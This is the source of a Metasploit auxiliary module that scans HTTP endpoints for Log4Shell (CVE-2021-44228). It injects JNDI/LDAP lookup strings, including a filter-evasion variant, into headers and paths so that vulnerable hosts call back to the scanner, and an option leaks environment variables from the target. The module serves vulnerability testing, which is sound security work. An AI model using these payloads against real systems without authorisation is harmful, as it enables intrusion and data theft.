##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Log4Shell
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Log4Shell HTTP Scanner',
      'Description' => %q{
        Versions of Apache Log4j2 impacted by CVE-2021-44228 which allow JNDI features used in configuration,
        log messages, and parameters, do not protect against attacker controlled LDAP and other JNDI related endpoints.

        This module will scan an HTTP end point for the Log4Shell vulnerability by injecting a format message that will
        trigger an LDAP connection to Metasploit. This module is a generic scanner and is only capable of identifying
        instances that are vulnerable via one of the pre-determined HTTP request injection points. These points include
        HTTP headers and the HTTP request path.

        Known impacted software includes Apache Struts 2, VMWare VCenter, Apache James, Apache Solr, Apache Druid,
        Apache JSPWiki, Apache OFBiz.
      },
      'Author' => [
        'Spencer McIntyre', # The fun stuff
        'RageLtMan <rageltman[at]sempervictus>', # Some plumbing
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
        [ 'CVE', '2021-45046' ],
        [ 'URL', 'https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis' ],
        [ 'URL', 'https://logging.apache.org/log4j/2.x/security.html' ]
      ],
      'DisclosureDate' => '2021-12-09',
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => []
      }
    )

    register_options([
      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
      OptString.new('LEAK_PARAMS', [ false, 'Additional parameters to leak, separated by the ^ character (e.g., ${env:USER}^${env:PATH})']),
      OptPath.new(
        'HEADERS_FILE',
        [
          false,
          'File containing headers to check',
          File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_headers.txt')
        ]
      ),
      OptPath.new(
        'URIS_FILE',
        [
          false,
          'File containing additional URIs to check',
          File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_uris.txt')
        ]
      ),
      OptInt.new('LDAP_TIMEOUT', [ true, 'Time in seconds to wait to receive LDAP connections', 30 ])
    ])
  end

  def log4j_jndi_string(resource = '')
    resource = resource.dup
    resource << '/${java:os}/${sys:java.vendor}_${sys:java.version}'
    # We should add obfuscation to the URL string to scan through lousy "next-gen" firewalls
    unless datastore['LEAK_PARAMS'].blank?
      resource << '/'
      resource << datastore['LEAK_PARAMS']
    end
    super(resource)
  end

  #
  # Handle incoming requests via service mixin
  #
  def build_ldap_search_response(msg_id, base_dn)
    token, java_os, java_version, uri_parts = base_dn.split('/', 4)
    target_info = @mutex.synchronize { @tokens.delete(token) }
    if target_info
      @mutex.synchronize { @successes << target_info }
      details = normalize_uri(target_info[:target_uri]).to_s
      details << " (header: #{target_info[:headers].keys.first})" unless target_info[:headers].nil?
      details << " (os: #{java_os})" unless java_os.blank?
      details << " (java: #{java_version})" unless java_version.blank?
      unless uri_parts.blank?
        uri_parts = uri_parts.split('^')
        leaked = ''
        datastore['LEAK_PARAMS'].split('^').each_with_index do |input, idx|
          next if input == uri_parts[idx]

          leaked << "#{input}=#{uri_parts[idx]}  "
        end
        unless leaked.blank?
          details << " (leaked: #{leaked.rstrip})"
          vprint_good("Leaked data: #{leaked.rstrip}")
        end
      end
      peerinfo = "#{target_info[:rhost]}:#{target_info[:rport]}"
      print_good("#{peerinfo.ljust(21)} - Log4Shell found via #{details}")
      report_vuln(
        host: target_info[:rhost],
        port: target_info[:rport],
        info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
        name: name,
        refs: references
      )
    end

    attrs = [ ]
    appseq = [
      base_dn.to_ber,
      attrs.to_ber_sequence
    ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
    [ msg_id.to_ber, appseq ].to_ber_sequence
  end

  def rand_text_alpha_lower_numeric(len, bad = '')
    foo = []
    foo += ('a'..'z').to_a
    foo += ('0'..'9').to_a
    Rex::Text.rand_base(len, bad, *foo)
  end

  def run
    validate_configuration!
    @mutex = Mutex.new
    @mutex.extend(::Rex::Ref)

    @tokens = {}
    @tokens.extend(::Rex::Ref)

    @successes = []
    @successes.extend(::Rex::Ref)

    begin
      start_service
    rescue Rex::BindFailed => e
      fail_with(Failure::BadConfig, e.to_s)
    end

    super

    print_status("Sleeping #{datastore['LDAP_TIMEOUT']} seconds for any last LDAP connections")
    sleep datastore['LDAP_TIMEOUT']

    if @successes.empty?
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Vulnerable(details: @successes)
  end

  def run_host(ip)
    # probe the target before continuing
    return if send_request_cgi('uri' => normalize_uri(target_uri)).nil?

    run_host_uri(ip, normalize_uri(target_uri)) unless target_uri.blank?

    return if datastore['URIS_FILE'].blank?

    File.open(datastore['URIS_FILE'], 'rb').each_line(chomp: true) do |uri|
      next if uri.blank? || uri.start_with?('#')

      if uri.include?('${jndi:uri}')
        token = rand_text_alpha_lower_numeric(8..32)
        jndi = log4j_jndi_string(token)
        uri.delete_prefix!('/')
        test(token, uri: normalize_uri(target_uri, '') + uri.gsub('${jndi:uri}', Rex::Text.uri_encode(jndi)))
      else
        run_host_uri(ip, normalize_uri(target_uri, uri))
      end
    end
  end

  def run_host_uri(_ip, uri)
    # HTTP_HEADER isn't exposed via the datastore but allows other modules to leverage this one to test a specific value
    unless datastore['HTTP_HEADER'].blank?
      token = rand_text_alpha_lower_numeric(8..32)
      test(token, uri: uri, headers: { datastore['HTTP_HEADER'] => log4j_jndi_string(token) })
    end

    unless datastore['HEADERS_FILE'].blank?
      headers_file = File.open(datastore['HEADERS_FILE'], 'rb')
      headers_file.each_line(chomp: true) do |header|
        next if header.blank? || header.start_with?('#')

        token = rand_text_alpha_lower_numeric(8..32)
        test(token, uri: uri, headers: { header => log4j_jndi_string(token) })
      end
    end

    token = rand_text_alpha_lower_numeric(8..32)
    jndi = log4j_jndi_string(token)
    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/')), '/'))

    token = rand_text_alpha_lower_numeric(8..32)
    jndi = log4j_jndi_string(token)
    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/'))))
  end

  def test(token, uri: nil, headers: nil)
    target_info = {
      rhost: rhost,
      rport: rport,
      target_uri: uri,
      headers: headers
    }
    @mutex.synchronize { @tokens[token] = target_info }

    send_request_raw(
      'uri' => uri,
      'method' => datastore['HTTP_METHOD'],
      'headers' => headers
    )
  end

  attr_accessor :mutex, :tokens, :successes
end
